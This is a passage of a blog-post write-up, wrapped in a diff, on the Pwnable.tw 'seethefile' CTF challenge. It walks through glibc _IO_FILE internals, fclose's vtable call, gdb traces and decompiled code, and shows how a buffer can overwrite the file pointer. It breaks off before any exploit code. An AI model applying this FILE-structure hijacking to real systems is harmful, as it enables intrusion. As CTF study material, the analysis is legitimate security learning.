@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>Pwnable.tw seethefile | AssassinQ</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  <meta name="keywords" content="ctfpwn">
+  
+  
+  
+  
+  <meta name="description" content="Get familiar with _IO_FILE.">
+<meta name="keywords" content="ctf,pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pwnable.tw seethefile">
+<meta property="og:url" content="https://qianfei11.github.io/2019/08/17/Pwnable-tw-seethefile/index.html">
+<meta property="og:site_name" content="AssassinQ">
+<meta property="og:description" content="Get familiar with _IO_FILE.">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-08-17T07:09:37.150Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Pwnable.tw seethefile">
+<meta name="twitter:description" content="Get familiar with _IO_FILE.">
+  
+    <link rel="alternate" href="/atom.xml" title="AssassinQ" type="application/atom+xml">
+  
+  <link rel="icon" href="/css/images/favicon.ico">
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
+  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+  <style type="text/css">
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
+    
+  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Yanone+Kaffeesatz%3A200%2C300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
+
+  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Oswald%3A300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
+  <link rel="stylesheet" href="/css/style.css">
+
+  <script src="/js/jquery-3.1.1.min.js"></script>
+
+  <!-- Bootstrap core CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.css">
+  <link rel="stylesheet" href="/css/fashion.css">
+  <link rel="stylesheet" href="/css/glyphs.css">
+
+</head>
+</html>
+
+
+  <body data-spy="scroll" data-target="#toc" data-offset="50">
+
+
+  
+  
+  <div class="site-header-image">
+    <img id="originBg" width="100%" alt="Hike News" src>
+  </div>
+
+  <div id="header-blur" class="site-header-image blur" style="position: absolute; top:0; height: 207px; min-height: 207px; min-width: 100%;">
+    <img id="blurBg" width="100%" style="top: 96%" alt="Hike News" src>
+  </div>
+
+  <script>
+        var imgUrls = "css/images/pose01.jpg".split(",");
+        var random = Math.floor((Math.random() * imgUrls.length ));
+        if (imgUrls[random].startsWith('http') || imgUrls[random].indexOf('://') >= 0) {
+          document.getElementById("originBg").src=imgUrls[random];
+          document.getElementById("blurBg").src=imgUrls[random];
+        } else {
+          document.getElementById("originBg").src='/' + imgUrls[random];
+          document.getElementById("blurBg").src='/' + imgUrls[random];
+        }
+    </script>
+
+
+
+
+<header id="allheader" class="site-header" role="banner" style="width: 100%; position: absolute; top:0; background: rgba(255,255,255,.8);">
+  <div class="clearfix container">
+      <div class="site-branding">
+
+          <h1 class="site-title">
+            
+              <a href="/" title="AssassinQ" rel="home"> AssassinQ </a>
+            
+          </h1>
+          
+          
+            <div class="site-description">ZJGSU-IS-17</div>
+          
+            
+          <nav id="main-navigation" class="main-navigation" role="navigation">
+            <a class="nav-open">Menu</a>
+            <a class="nav-close">Close</a>
+
+            <div class="clearfix sf-menu">
+              <ul id="main-nav" class="menu sf-js-enabled sf-arrows" style="touch-action: pan-y;">
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/">Home</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/archives">Archives</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/tags">Tags</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/about">About</a> </li>
+                    
+              </ul>
+            </div>
+          </nav>
+
+      </div>
+  </div>
+</header>
+
+
+  <div id="container">
+    <div id="wrap">
+            
+      <div id="content" class="outer">
+        
+          <section id="main" style="float:none;"><article id="post-Pwnable-tw-seethefile" style="width: 66%; float:left;" class="article article-type-post" itemscope itemprop="blogPost">
+  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" itemprop="name">
+      Pwnable.tw seethefile
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2019/08/17/Pwnable-tw-seethefile/" class="article-date">
+	  <time datetime="2019-08-17T02:43:55.000Z" itemprop="datePublished">August 17, 2019</time>
+	</a>
+
+       
+      
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Get familiar with <code>_IO_FILE</code>.</p>
+<a id="more"></a>
+<h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p>关于<a href="https://code.woboq.org/userspace/glibc/libio/bits/types/struct_FILE.h.html" target="_blank" rel="noopener"><code>_IO_FILE</code>的结构体</a>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The tag name of this struct is _IO_FILE to preserve historic</span></span><br><span class="line"><span class="comment">   C++ mangled names for functions taking FILE* arguments.</span></span><br><span class="line"><span class="comment">   That name should not be used in new code.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;                <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_read_ptr;        <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_read_end;        <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_read_base;        <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_write_base;        <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_write_ptr;        <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_write_end;        <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_buf_base;        <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_buf_end;        <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line">  <span class="keyword">__off_t</span> _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>关于<a href="https://code.woboq.org/userspace/glibc/libio/fileops.c.html" target="_blank" rel="noopener"><code>vtable</code>的结构</a>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_file_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_file_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_file_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_default_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_file_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_file_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_new_file_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_new_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_new_file_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_file_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_file_read),</span><br><span class="line">  JUMP_INIT(write, _IO_new_file_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_file_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_file_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_file_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>然后了解一下为什么可以利用<a href="https://code.woboq.org/userspace/glibc/libio/iofclose.c.html" target="_blank" rel="noopener"><code>fclose</code>函数</a>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_fclose (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> status;</span><br><span class="line">  CHECK_FILE(fp, EOF);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)</span></span><br><span class="line">  <span class="comment">/* We desperately try to help programs which are using streams in a</span></span><br><span class="line"><span class="comment">     strange way and mix old and new functions.  Detect old streams</span></span><br><span class="line"><span class="comment">     here.  */</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> _IO_old_fclose (fp);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="comment">/* First unlink the stream.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    _IO_un_link ((struct _IO_FILE_plus *) fp);</span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    status = _IO_file_close_it (fp);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? <span class="number">-1</span> : <span class="number">0</span>;</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  _IO_FINISH (fp);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* This stream has a wide orientation.  This means we have to free</span></span><br><span class="line"><span class="comment">         the conversion functions.  */</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cc</span> = <span class="title">fp</span>-&gt;_<span class="title">codecvt</span>;</span></span><br><span class="line">      __libc_lock_lock (__gconv_lock);</span><br><span class="line">      __gconv_release_step (cc-&gt;__cd_in.__cd.__steps);</span><br><span class="line">      __gconv_release_step (cc-&gt;__cd_out.__cd.__steps);</span><br><span class="line">      __libc_lock_unlock (__gconv_lock);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (_IO_have_backup (fp))</span><br><span class="line">        _IO_free_backup_area (fp);</span><br><span class="line">    &#125;</span><br><span class="line">  _IO_deallocate_file (fp);</span><br><span class="line">  <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后我们通过<code>gdb</code>调试一下，在<code>_IO_new_fclose</code>处下断点：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">   0xf76579da:  xchg   ax,ax</span><br><span class="line">   0xf76579dc:  xchg   ax,ax</span><br><span class="line">   0xf76579de:  xchg   ax,ax</span><br><span class="line">=&gt; 0xf76579e0 &lt;_IO_new_fclose&gt;: push   ebp</span><br><span class="line">   0xf76579e1 &lt;_IO_new_fclose+1&gt;:       mov    ebp,esp</span><br><span class="line">   0xf76579e3 &lt;_IO_new_fclose+3&gt;:       push   edi</span><br><span class="line">   0xf76579e4 &lt;_IO_new_fclose+4&gt;:       push   esi</span><br><span class="line">   0xf76579e5 &lt;_IO_new_fclose+5&gt;:       push   ebx</span><br></pre></td></tr></table></figure>
+<p>接下来一直运行到<code>_IO_new_fclose+132</code>处，调用了<code>_IO_new_file_close_it</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">   0xf7657a5e &lt;_IO_new_fclose+126&gt;:     je     0xf7657aa8 &lt;_IO_new_fclose+200&gt;</span><br><span class="line">   0xf7657a60 &lt;_IO_new_fclose+128&gt;:     sub    esp,0xc</span><br><span class="line">   0xf7657a63 &lt;_IO_new_fclose+131&gt;:     push   esi</span><br><span class="line">=&gt; 0xf7657a64 &lt;_IO_new_fclose+132&gt;:     call   0xf7663810 &lt;_IO_new_file_close_it&gt;</span><br><span class="line">   0xf7657a69 &lt;_IO_new_fclose+137&gt;:     mov    edx,DWORD PTR [esi]</span><br><span class="line">   0xf7657a6b &lt;_IO_new_fclose+139&gt;:     add    esp,0x10</span><br><span class="line">   0xf7657a6e &lt;_IO_new_fclose+142&gt;:     mov    edi,eax</span><br><span class="line">   0xf7657a70 &lt;_IO_new_fclose+144&gt;:     and    edx,0x8000</span><br></pre></td></tr></table></figure>
+<p>最后<code>call [eax+0x44]</code>，发现这时<code>eax</code>即为<code>vtable</code>的地址，而<code>0x44</code>则为<code>_IO_file_close</code>的偏移：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">   0xf7663914 &lt;_IO_new_file_close_it+260&gt;:      sub    esp,0xc</span><br><span class="line">   0xf7663917 &lt;_IO_new_file_close_it+263&gt;:      mov    eax,DWORD PTR [ebx+eax*1+0x94]</span><br><span class="line">   0xf766391e &lt;_IO_new_file_close_it+270&gt;:      push   ebx</span><br><span class="line">=&gt; 0xf766391f &lt;_IO_new_file_close_it+271&gt;:      call   DWORD PTR [eax+0x44]</span><br><span class="line">   0xf7663922 &lt;_IO_new_file_close_it+274&gt;:      add    esp,0x10</span><br><span class="line">   0xf7663925 &lt;_IO_new_file_close_it+277&gt;:      mov    esi,eax</span><br><span class="line">   0xf7663927 &lt;_IO_new_file_close_it+279&gt;:      jmp    0xf766384f &lt;_IO_new_file_close_it+63&gt;</span><br><span class="line">   0xf766392c &lt;_IO_new_file_close_it+284&gt;:      lea    esi,[esi+eiz*1+0x0]</span><br></pre></td></tr></table></figure>
+<h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@595b467648a0:~/tmp<span class="comment"># checksec ./seethefile</span></span><br><span class="line">[*] <span class="string">'/root/tmp/seethefile'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+<p>先用<code>keypatch</code>把<code>alarm</code>给patch掉，方便用<code>gdb</code>调试：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">.text:0804870B                 public init</span><br><span class="line">.text:0804870B init            proc near               ; CODE XREF: main+1C↓p</span><br><span class="line">.text:0804870B ; __unwind &#123;</span><br><span class="line">.text:0804870B                 push    ebp</span><br><span class="line">.text:0804870C                 mov     ebp, esp</span><br><span class="line">.text:0804870E                 sub     esp, 8</span><br><span class="line">.text:08048711                 mov     eax, ds:stdout@@GLIBC_2_0</span><br><span class="line">.text:08048716                 push    0               ; n</span><br><span class="line">.text:08048718                 push    2               ; modes</span><br><span class="line">.text:0804871A                 push    0               ; buf</span><br><span class="line">.text:0804871C                 push    eax             ; stream</span><br><span class="line">.text:0804871D                 call    _setvbuf</span><br><span class="line">.text:08048722                 add     esp, 10h</span><br><span class="line">.text:08048725                 sub     esp, 8</span><br><span class="line">.text:08048728                 push    offset handler  ; handler</span><br><span class="line">.text:0804872D                 push    0Eh             ; sig</span><br><span class="line">.text:0804872F                 call    _signal</span><br><span class="line">.text:08048734                 add     esp, 10h</span><br><span class="line">.text:08048737                 sub     esp, 0Ch</span><br><span class="line">.text:0804873A                 nop</span><br><span class="line">.text:0804873B                 nop</span><br><span class="line">.text:0804873C                 nop</span><br><span class="line">.text:0804873D                 nop</span><br><span class="line">.text:0804873E                 nop</span><br><span class="line">.text:0804873F                 nop</span><br><span class="line">.text:08048740                 nop</span><br><span class="line">.text:08048741                 add     esp, 10h</span><br><span class="line">.text:08048744                 nop</span><br><span class="line">.text:08048745                 leave</span><br><span class="line">.text:08048746                 retn</span><br><span class="line">.text:08048746 ; &#125; // starts at 804870B</span><br><span class="line">.text:08048746 init            endp</span><br></pre></td></tr></table></figure>
+<p>可以看到是个菜单：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> nptr; <span class="comment">// [esp+Ch] [ebp-2Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  init();</span><br><span class="line">  welcome();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    __isoc99_scanf(<span class="string">"%s"</span>, &amp;nptr);</span><br><span class="line">    <span class="keyword">switch</span> ( atoi(&amp;nptr) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        openfile();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        readfile();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        writefile();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        closefile();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Leave your name :"</span>);</span><br><span class="line">        __isoc99_scanf(<span class="string">"%s"</span>, &amp;name);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Thank you %s ,see you next time\n"</span>, &amp;name);</span><br><span class="line">        <span class="keyword">if</span> ( fp )</span><br><span class="line">          fclose(fp);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Invaild choice"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>readfile</code>里有一个<code>magicbuf</code>，可以读<code>0x18F</code>个字节，很可能有溢出：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">readfile</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(magicbuf, <span class="number">0</span>, <span class="number">0x190</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !fp )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"You need to open a file first"</span>);</span><br><span class="line">  result = fread(magicbuf, <span class="number">0x18F</span>u, <span class="number">1u</span>, fp);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"Read Successful"</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>发现在<code>.bss</code>段上可以用<code>magicbuf</code>把<code>fp</code>指针盖掉：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">.bss:0804B0C0                 public magicbuf</span><br><span class="line">.bss:0804B0C0 ; char magicbuf[416]</span><br><span class="line">.bss:0804B0C0 magicbuf        db 1A0h dup(?)          ; DATA XREF: openfile+33↑o</span><br><span class="line">.bss:0804B0C0                                         ; readfile+17↑o ...</span><br><span class="line">.bss:0804B260                 public name</span><br><span class="line">.bss:0804B260 name            db    ? ;               ; DATA XREF: main+9F↑o</span><br><span class="line">.bss:0804B260                                         ; main+B4↑o</span><br><span class="line">.bss:0804B261                 db    ? ;</span><br><span class="line">.bss:0804B262                 db    ? ;</span><br><span class="line">.bss:0804B263                 db    ? ;</span><br><span class="line">.bss:0804B264                 db    ? ;</span><br><span class="line">.bss:0804B265                 db    ? ;</span><br><span class="line">.bss:0804B266                 db    ? ;</span><br><span class="line">.bss:0804B267                 db    ? ;</span><br><span class="line">.bss:0804B268                 db    ? ;</span><br><span class="line">.bss:0804B269                 db  